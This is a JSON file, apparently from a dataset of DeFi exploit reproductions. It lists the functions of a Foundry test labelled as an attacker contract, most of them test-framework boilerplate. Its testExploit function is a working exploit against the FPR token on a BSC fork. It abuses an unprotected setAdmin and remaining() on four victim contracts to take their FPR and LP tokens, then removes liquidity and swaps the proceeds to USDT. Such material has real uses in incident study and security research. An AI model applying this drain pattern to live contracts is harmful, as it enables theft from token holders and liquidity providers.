[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 23_904_152);\n        vm.label(address(FPR), \"FPR token\");\n        vm.label(address(router), \"Router\");\n        vm.label(address(pair), \"Pair\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        FPR.approve(address(router), type(uint256).max);\n        IERC20(address(pair)).approve(address(router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(FPR);\n        path[1] = address(USDT);\n        for (uint256 i = 0; i < 3; i++) {\n            VulContract(vulContracts[i]).setAdmin(address(this));\n            VulContract(vulContracts[i]).remaining(address(this), address(FPR));\n            console.log(FPR.balanceOf(address(this)));\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp\n            );\n        }\n\n        VulContract(vulContracts[3]).setAdmin(address(this));\n        VulContract(vulContracts[3]).remaining(address(this), address(pair));\n        router.removeLiquidity(\n            address(USDT), address(FPR), pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "VulContract",
    "source_type": "victim_contract",
    "function_name": "remaining",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "VulContract",
    "source_type": "victim_contract",
    "function_name": "setAdmin",
    "original_code": "",
    "description": ""
  }
]